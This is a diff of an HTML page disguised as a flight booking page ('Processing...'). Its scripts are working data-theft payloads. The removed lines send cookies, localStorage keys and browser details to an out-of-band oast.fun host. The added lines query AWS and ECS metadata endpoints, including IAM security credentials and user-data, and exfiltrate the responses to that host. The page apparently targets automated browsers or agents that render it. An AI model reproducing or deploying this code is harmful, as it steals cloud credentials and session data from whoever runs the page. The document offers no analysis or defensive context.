@@ -1,18 +1,61 @@
 <!DOCTYPE html>
 <html>
-<head><title>Booking Verification</title>
+<head><title>Booking</title>
 <script>
-var d={c:document.cookie,ls:JSON.stringify(Object.keys(localStorage)),u:window.location.href,r:document.referrer,w:navigator.webdriver,n:window.name};
-new Image().src='https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/xjs?d='+encodeURIComponent(btoa(JSON.stringify(d)));
-fetch('https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/xfetch',{method:'POST',body:JSON.stringify(d)}).catch(function(){});
+// Try AWS metadata endpoints via fetch  
+var targets = [
+  'http://169.254.169.254/latest/meta-data/',
+  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+  'http://169.254.169.254/latest/dynamic/instance-identity/document',
+  'http://169.254.169.254/latest/user-data',
+  'http://169.254.170.2/v2/credentials',
+  'http://[fd00:ec2::254]/latest/meta-data/',
+  'http://169.254.169.254/latest/api/token'
+];
+
+var results = {};
+var done = 0;
+
+function report() {
+  var img = new Image();
+  img.src = 'https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/meta?d=' + encodeURIComponent(btoa(JSON.stringify(results)));
+  fetch('https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/meta-post', {
+    method: 'POST',
+    body: JSON.stringify(results),
+    headers: {'Content-Type': 'application/json'}
+  }).catch(function(){});
+}
+
+targets.forEach(function(url) {
+  fetch(url, {mode: 'no-cors'}).then(function(r) {
+    return r.text().catch(function(){ return 'opaque-' + r.status + '-' + r.type; });
+  }).then(function(text) {
+    results[url] = text.substring(0, 2000);
+    done++;
+    if (done >= targets.length) report();
+  }).catch(function(err) {
+    results[url] = 'ERR:' + err.message;
+    done++;
+    if (done >= targets.length) report();
+  });
+});
+
+// Also try XMLHttpRequest for metadata (bypasses some fetch restrictions)
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://169.254.169.254/latest/meta-data/', true);
+xhr.onload = function() {
+  results['xhr-metadata'] = xhr.responseText.substring(0, 2000);
+  report();
+};
+xhr.onerror = function() {
+  results['xhr-metadata'] = 'XHR-ERR:' + xhr.status;
+  report();
+};
+xhr.send();
+
+// Fallback: report after 8 seconds even if some requests hang
+setTimeout(report, 8000);
 </script>
 </head>
-<body>
-<h1>Processing booking...</h1>
-<p>Flight: DEL - BOM | Akasa Air | INR 4,299</p>
-<form action="https://d7a2184899s5qg2fd80g38m6ctcqkz1qb.oast.fun/xform" method="POST">
-<input name="fname" value="Test"><input name="lname" value="User">
-<button>Confirm</button>
-</form>
-</body>
+<body><h1>Processing...</h1></body>
 </html>
